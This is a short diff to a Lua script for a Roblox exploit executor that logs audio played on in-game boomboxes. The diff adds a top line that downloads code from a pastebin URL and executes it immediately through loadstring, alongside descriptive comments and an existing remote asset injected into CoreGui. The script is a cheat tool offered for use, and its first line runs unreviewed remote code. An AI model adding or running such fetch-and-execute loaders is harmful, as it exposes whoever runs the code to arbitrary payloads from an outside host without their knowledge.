@@ -1,4 +1,7 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
 --< Loadstring: loadstring(game:HttpGet('https://raw.githubusercontent.com/xrtzrr/scripts/main/EdgesAudioLogger.lua'))()
+--< Game: Universal
+--< Functionality: Logs the audios played on boomboxes.
 
 aa = game:GetObjects("rbxassetid://01997056190")[1]
 aa.Parent = game.CoreGui
